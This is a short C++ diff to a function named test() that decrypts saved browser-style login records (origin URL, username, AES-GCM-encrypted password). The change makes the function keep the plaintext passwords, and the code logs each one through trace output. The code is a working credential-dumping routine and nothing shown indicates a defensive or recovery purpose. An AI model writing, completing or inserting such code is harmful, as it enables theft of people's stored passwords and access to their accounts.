@@ -155,18 +155,15 @@ void test()
 			);
 			Buffer raw_encrypted_password = Strings::to_buffer(password_value);
 			auto [iv, encrypted_password] = parse_password(raw_encrypted_password);
-			decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);
+			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);
 
 			credentials.emplace_back(
 				origin_url,
 				username_value,
-				Strings::to_wstring(Strings::to_string(encrypted_password))
+				Strings::to_wstring(Strings::to_string(plaintext_password))
 			);
 		}
-		catch (...)
-		{
-			TRACE(L"failed to decrypt password");
-		}
+		CATCH_AND_TRACE()
 	}
 
 	for (const Credential& cred : credentials)
@@ -174,7 +171,7 @@ void test()
 		TRACE(
 			L"origin_url: '",
 			cred.origin.c_str(),
-			L"username_value: '",
+			L"', username_value: '",
 			cred.username.c_str(),
 			"', password_value: '",
 			cred.password.c_str(),
